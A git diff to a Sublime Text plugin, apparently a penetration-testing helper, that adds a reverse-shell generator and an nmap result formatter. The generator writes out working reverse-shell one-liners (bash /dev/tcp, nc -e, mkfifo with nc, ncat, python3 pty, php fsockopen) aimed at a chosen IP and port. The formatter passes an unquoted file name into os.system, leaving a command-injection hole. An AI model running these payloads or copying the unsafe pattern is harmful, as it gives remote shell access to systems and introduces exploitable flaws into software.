@@ -4,7 +4,7 @@
 import sublime
 from .config import *
 import re, os, hashlib, socket
-from urllib.parse import urlparse
+from urllib.parse import urlparse, quote, unquote
 import ipaddress
 
 
@@ -308,4 +308,75 @@ def filter_routers(results):
 
     routers = [('/' + line) for line in routers]
     text = '\n'.join(routers+links+filters).lstrip('/')
+    return text
+
+
+'''
+Reverse shell tool
+# bash, /bin/bash
+# sh, /bin/sh
+# python, php, nc
+'''
+
+def reverse_shell_tools(shell,ip_port):
+    if ip_port.count(':') != 1:
+        info = '[-] Input format has error(ip:port)'
+        return info
+    ip,port = ip_port.split(':')
+
+    shell_template = '''
+---------------------------------------------------------------------------------------
+# Bash -i
+{cmd} -i >& /dev/tcp/{ip}/{port} 0>&1
+
+# Bash 196
+0<&196;exec 196<>/dev/tcp/{ip}/{port}; {cmd} <&196 >&196 2>&196
+
+# Bash 5
+{cmd} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5
+
+# Bash read line
+exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done
+---------------------------------------------------------------------------------------
+'''
+    other_template = '''
+---------------------------------------------------------------------------------------
+# nc -e
+nc {ip} {port} -e bash
+
+# nc -c
+nc -c sh {ip} {port}
+
+# nc mkfifo
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f
+
+# ncat -c
+ncat {ip} {port} -e sh
+
+# python3
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+
+# php
+php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'
+---------------------------------------------------------------------------------------
+''' 
+    
+    if shell == 'other':
+        return other_template.format(ip=ip,port=port)
+    else:
+        return shell_template.format(cmd=shell,ip=ip,port=port) +  shell_template.format(cmd='/bin/'+shell,ip=ip,port=port)
+
+
+'''
+Formating some tool's resulte
+# nmap: result(xml) -> host:port
+: nmap ... -oX xxx.xml
+
+'''
+
+def format_nmap_open_port(file):
+    script_path = os.path.join(sublime.packages_path(),"Xtools-Pro/lib/format-nmap-open-port.py")
+    cmd = 'python3 "{script}" {file}'.format(script=script_path,file=file)
+    os.system(cmd)
+    text = read_file(file)
     return text
